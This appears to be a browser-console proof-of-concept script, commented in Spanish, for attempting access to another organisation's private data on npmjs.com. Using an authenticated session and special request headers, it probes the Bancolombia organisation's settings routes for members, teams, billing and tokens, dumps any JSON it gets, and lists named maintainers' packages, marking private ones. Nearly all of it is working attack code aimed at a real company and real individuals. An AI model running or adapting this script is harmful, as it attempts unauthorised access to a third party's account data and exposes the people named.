// ================================================================
// PoC: Intentar acceder a datos de org Bancolombia
// EJECUTAR EN: https://www.npmjs.com (sesión autenticada)
// ================================================================

console.log("=== PoC Bancolombia - Acceso a Org Ajena ===");

const spiferackHeaders = {
    'x-spiferack': '1',
    'x-requested-with': 'XMLHttpRequest',
    'manifest-hash': window.__context__?.hash || ''
};

// Test todas las rutas posibles de la org
(async () => {
    const routes = [
        '/org/bancolombia',
        '/settings/bancolombia/packages',
        '/settings/bancolombia/members',
        '/settings/bancolombia/teams',
        '/settings/bancolombia/billing',
        '/settings/bancolombia/tokens',
        // Probar con ~ (perfil público)
        '/~bancolombia',
        '/~bancolombia-os',
    ];

    for (const route of routes) {
        try {
            const res = await fetch(route, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            const status = res.status;
            const contentType = res.headers.get('content-type') || '';

            if (status === 200 && contentType.includes('json')) {
                const data = await res.json();
                const keys = Object.keys(data);
                console.log(`[!!!] ${route} → HTTP 200 JSON (${keys.length} keys)`);

                // Buscar datos sensibles
                if (data.packages) {
                    const pkgs = data.packages;
                    console.log(`    PAQUETES: ${JSON.stringify(pkgs).substring(0, 500)}`);
                }
                if (data.members) {
                    console.log(`    MIEMBROS: ${JSON.stringify(data.members).substring(0, 500)}`);
                }
                if (data.teams) {
                    console.log(`    TEAMS: ${JSON.stringify(data.teams).substring(0, 500)}`);
                }
                if (data.scope) {
                    console.log(`    SCOPE: ${JSON.stringify(data.scope).substring(0, 300)}`);
                }
                // Imprimir todo si es corto
                const full = JSON.stringify(data);
                if (full.length < 2000) {
                    console.log(`    DATOS COMPLETOS: ${full}`);
                } else {
                    console.log(`    Keys: ${keys.join(', ')}`);
                    // Imprimir cada key resumida
                    for (const k of keys) {
                        const v = JSON.stringify(data[k]);
                        console.log(`    ${k}: ${v.substring(0, 200)}${v.length > 200 ? '...' : ''}`);
                    }
                }
            } else if (status === 200) {
                const text = await res.text();
                console.log(`[+] ${route} → HTTP 200 HTML (${text.length} bytes)`);
                // Buscar __context__ en el HTML
                const ctxMatch = text.match(/__context__\s*=\s*(\{.*?\})\s*<\/script>/s);
                if (ctxMatch) {
                    console.log(`    [!!!] __context__ encontrado en HTML`);
                }
            } else {
                console.log(`[-] ${route} → HTTP ${status}`);
            }
        } catch(e) {
            console.log(`[-] ${route} → Error: ${e.message}`);
        }
    }

    // Probar los perfiles de los maintainers de bancolombia
    console.log("\n=== Perfiles públicos de maintainers de Bancolombia ===");
    const maintainers = ['bancolombia-os', 'emorae', 'atortole', 'santitigaga', 'alejobtc'];

    for (const user of maintainers) {
        try {
            const res = await fetch(`/~${user}`, {
                headers: spiferackHeaders,
                credentials: 'include'
            });

            if (res.ok) {
                const contentType = res.headers.get('content-type') || '';
                if (contentType.includes('json')) {
                    const data = await res.json();
                    console.log(`\n[+] /~${user}:`);
                    if (data.packages) {
                        const pkgList = data.packages?.objects || data.packages;
                        const count = Array.isArray(pkgList) ? pkgList.length : (data.packages?.total || '?');
                        console.log(`    Paquetes: ${count}`);
                        if (Array.isArray(pkgList)) {
                            pkgList.slice(0, 10).forEach(p => {
                                const name = p.name || p.package?.name || '?';
                                const priv = p.access === 'restricted' ? ' [PRIVADO]' : '';
                                console.log(`      - ${name}${priv}`);
                            });
                        }
                    }
                    if (data.orgs) {
                        console.log(`    Orgs: ${JSON.stringify(data.orgs).substring(0, 300)}`);
                    }
                    if (data.scope) {
                        console.log(`    Scope: ${JSON.stringify(data.scope).substring(0, 200)}`);
                    }
                    if (data.account) {
                        console.log(`    Account: ${JSON.stringify(data.account)}`);
                    }
                }
            } else {
                console.log(`[-] /~${user} → HTTP ${res.status}`);
            }
        } catch(e) {
            console.log(`[-] /~${user} → Error: ${e.message}`);
        }
    }
})();
